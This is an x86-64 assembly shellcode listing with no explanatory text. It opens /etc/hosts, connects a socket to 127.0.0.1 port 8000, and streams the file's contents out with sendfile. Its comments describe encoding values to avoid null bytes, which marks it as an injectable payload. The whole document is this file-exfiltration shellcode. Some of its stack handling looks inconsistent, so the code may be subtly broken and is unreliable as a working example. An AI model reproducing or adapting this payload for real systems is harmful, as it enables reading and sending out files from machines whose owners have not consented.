.globl _start
_start:
	// open
	movw $0x7374, %r11w             /* ts */
	push %r11
	movq $0x736f682f6374652f, %r11  /* /etc/hos */
	push %r11
	lea 0(%rsp), %rdi
	xor %rsi, %rsi
	addb $0x02, %al
	syscall
	push %rax												/* save fd for /etc/hosts */

	// socket
	xor %rdi, %rdi
	mov $0x02, %rdi
	mov $0x01, %rsi
	xor %rdx, %rdx
	mov $41, %rax
	syscall
	push %rax                       /* save socket fd */

	// connect
	mov %rax, %rdi
	xor %rsi, %rsi
	xor %r10, %r10
	xor %r11, %r11
	push %r11

	mov $0xfeffff80, %r10d          /* ~127.0.0.1 to exclude null bytes */
	not %r10d
	push %r10
	pushw $0x401f                   /* port 8000 */
	mov $02, %r11                   /* AF_INET */
	push %r11w
	mov $0x10, %rdx
	mov %rsp, %rsi
	mov $42, %rax
	syscall
	pop %rdi                        /* clean the stack */
	pop %rdi

	// sendfile
	pop %rdi                        /* socket fd */
	shr $32, %rdi
	pop %rsi                        /* file fd */
	shr $32, %rsi
	xor %rdx, %rdx
	mov $0xffff, %r10               /* arbitrary number of bytes to read from /etc/hosts */
	mov $40, %al
	syscall

	// exit
	xor %rdi, %rdi
	mov $3, %dl
	xor %rax, %rax
	mov $60, %al
	syscall
